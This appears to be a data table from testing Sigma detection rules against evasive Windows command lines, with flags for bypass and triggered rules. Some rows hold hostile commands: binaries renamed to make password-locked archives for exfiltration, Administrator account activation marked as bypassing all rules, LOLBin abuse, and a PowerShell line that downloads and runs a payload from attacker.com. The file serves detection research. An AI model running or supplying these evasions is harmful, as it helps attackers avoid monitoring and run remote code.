Technical	Rule_name	Title	Rule_id	Command_match_rule	Commandline_evasion	Excutable	Bypass target rule	Bypass all rule	Trigger rule
t1560.001	proc_creation_win_7zip_password_compression	Compress Data and Lock With Password for Exfiltration With 7-ZIP	9fbf5927-5261-4284-a71d-f681029ea574		copy 7z.exe svchost.exe && svchost.exe a -password123 archive.7z C:\data\*	FALSE	FALSE	FALSE	
t1560.001	proc_creation_win_net_user_default_accounts_manipulation	Suspicious Manipulation Of Default Accounts Via Net.EXE	5b768e71-86f2-4879-b448-81061cbae951	C:\WINDOWS\system32\net1   user administrator /domain	C:\WINDOWS\system32\net1  user administrator /domain	TRUE	FALSE	FALSE	Suspicious Manipulation Of Default Accounts Via Net.EXE (5b768e71-86f2-4879-b448-81061cbae951)
t1560.001	proc_creation_win_net_user_default_accounts_manipulation	Suspicious Manipulation Of Default Accounts Via Net.EXE	5b768e71-86f2-4879-b448-81061cbae951	net   user administrator /domain	net  user administrator /domain	TRUE	FALSE	FALSE	Suspicious Manipulation Of Default Accounts Via Net.EXE (5b768e71-86f2-4879-b448-81061cbae951); Suspicious Manipulation Of Default Accounts Via Net.EXE (5b768e71-86f2-4879-b448-81061cbae951)
t1560.001	proc_creation_win_net_user_default_accounts_manipulation	Suspicious Manipulation Of Default Accounts Via Net.EXE	5b768e71-86f2-4879-b448-81061cbae951		"net user ""Admin""istrator /active:yes"	TRUE	TRUE	TRUE	
t1560.001	proc_creation_win_net_user_default_accounts_manipulation	Suspicious Manipulation Of Default Accounts Via Net.EXE	5b768e71-86f2-4879-b448-81061cbae951		net user Administrator/active:yes	TRUE	TRUE	TRUE	
t1560.001	proc_creation_win_rar_compress_data	Files Added To An Archive Using Rar.EXE	6f3e2987-db24-4c78-a860-b4f4095a7095		"copy ""rar.exe"" archiver.exe && archiver.exe a C:\Temp\archive.rar C:\SensitiveData\*"	FALSE	FALSE	FALSE	
t1560.001	proc_creation_win_rar_compression_with_password	Rar Usage with Password and Compression Level	faa48cae-6b25-4f00-a094-08947fef582f		"rar.exe ""a"" ""-hpSecret"" ""-m5"" archive.rar C:\temp\sensitive_data.txt"	FALSE	FALSE	FALSE	
t1560.001	proc_creation_win_rar_compression_with_password	Rar Usage with Password and Compression Level	faa48cae-6b25-4f00-a094-08947fef582f		rar.exe a -hpSecret -m5 archive.rar C:\temp\sensitive_data.txt	FALSE	FALSE	FALSE	
t1560.001	proc_creation_win_rar_compression_with_password	Rar Usage with Password and Compression Level	faa48cae-6b25-4f00-a094-08947fef582f		rar.exe a -pSecret -m5 archive.rar C:\temp\sensitive_data.txt	FALSE	FALSE	FALSE	
t1560.001	proc_creation_win_winzip_password_compression	Compress Data and Lock With Password for Exfiltration With WINZIP	e2e80da2-8c66-4e00-ae3c-2eebd29f6b6d	"""cmd.exe"" /c path=%%%%path%%%%;""C:\Program Files (x86)\winzip"" & mkdir .\tmp\victim-files & cd .\tmp\victim-files & echo ""This file will be encrypted"" > .\encrypted_file.txt & ""%%%%ProgramFiles%%%%\WinZip\winzip64.exe"" -min -a -s""hello"" archive.zip * & dir"	"""cmd.exe"" /c path=%%path%%;""C:\Program Files (x86)\winzip"" & mkdir .\tmp\victim-files & cd .\tmp\victim-files & echo ""This file will be encrypted"" > .\encrypted_file.txt & ""%%ProgramFiles%%\WinZip\winzip64.exe"" -min -a -s""hello"" archive.zip * & dir"	TRUE	FALSE	FALSE	Compress Data and Lock With Password for Exfiltration With WINZIP (e2e80da2-8c66-4e00-ae3c-2eebd29f6b6d); File And SubFolder Enumeration Via Dir Command (7c9340a9-e2ee-4e43-94c5-c54ebbea1006)
unknown	proc_creation_win_addinutil_uncommon_child_process				AddInUtil.exe C:\Temp\malicious.addin	FALSE	FALSE	FALSE	
unknown	proc_creation_win_addinutil_uncommon_child_process				copy cmd.exe conhost.exe /Y && AddInUtil.exe C:\Temp\malicious.addin	FALSE	FALSE	FALSE	
unknown	proc_creation_win_aspnet_compiler_exectuion				copy aspnet_compiler.exe not_a_compiler.exe && not_a_compiler.exe -v / -p C:\path\to\malicious\code C:\Windows\Temp	FALSE	FALSE	FALSE	
unknown	proc_creation_win_aspnet_compiler_exectuion				"New-Item -ItemType HardLink -Path ""linked_compiler.exe"" -Target ""aspnet_compiler.exe""; .\linked_compiler.exe -v / -p C:\payload C:\Windows\Temp"	FALSE	FALSE	FALSE	
unknown	proc_creation_win_aspnet_compiler_susp_child_process				aspnet_compiler.exe -v / certutil.exe	FALSE	FALSE	FALSE	
unknown	proc_creation_win_aspnet_compiler_susp_child_process				"aspnet_compiler.exe -v / cmd.exe /c ""copy calc.exe work.exe && work.exe"""	FALSE	FALSE	FALSE	
unknown	proc_creation_win_aspnet_compiler_susp_child_process				"aspnet_compiler.exe -v / powershell.exe -ExecutionPolicy Bypass -Command ""IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"""	FALSE	FALSE	FALSE	
unknown	proc_creation_win_bginfo_suspicious_child_process				"""bginfo.exe"" config.bgi /popup /nolicprompt"	FALSE	FALSE	FALSE	
